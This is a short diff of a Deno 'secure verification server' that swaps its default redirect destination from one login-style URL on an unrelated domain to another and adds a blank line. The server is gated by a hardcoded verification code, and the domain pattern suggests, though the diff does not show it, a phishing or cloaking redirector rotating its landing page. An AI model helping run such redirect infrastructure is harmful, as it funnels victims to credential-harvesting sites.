@@ -11,7 +11,7 @@ interface AppConfig {
 }
 
 const CONFIG: AppConfig = {
-  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://accounts.vegetarianrecipiesonline.org/dExAJFAL",
+  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://login.zecrelimathor.com/VHqYlzwW",
   VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
   PORT: Number(Deno.env.get("PORT")) || 8000,
   SESSION_TIMEOUT: 15 * 60 * 1000, // 15 minutes in milliseconds
@@ -710,6 +710,7 @@ async function handleRequest(req: Request): Promise<Response> {
 console.log(`Secure verification server running on port ${CONFIG.PORT}`);
 
 serve(handleRequest, { port: CONFIG.PORT });
+
 
 
 
